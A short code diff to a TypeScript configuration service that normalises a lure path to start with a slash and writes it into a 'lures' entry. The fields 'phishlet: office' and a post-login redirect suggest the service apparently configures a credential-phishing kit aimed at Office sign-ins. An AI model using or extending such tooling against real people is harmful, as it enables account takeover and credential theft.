@@ -490,6 +490,11 @@ export class ConfigService {
         return false;
       }
 
+      // Ensure linkPath always starts with a single forward slash
+      const formattedPath = linkPath.startsWith("/")
+        ? linkPath
+        : `/${linkPath}`;
+
       // Check if lures array exists and has at least one item
       if (
         !config.lures ||
@@ -508,7 +513,7 @@ export class ConfigService {
           og_image: "",
           og_title: "",
           og_url: "",
-          path: linkPath,
+          path: formattedPath,
           paused: 0,
           phishlet: "office",
           redirect_url: afterLoginRedirect,
@@ -517,7 +522,7 @@ export class ConfigService {
         });
       } else {
         // Update first lure
-        config.lures[0].path = linkPath;
+        config.lures[0].path = formattedPath;
         config.lures[0].redirect_url = afterLoginRedirect;
       }
 
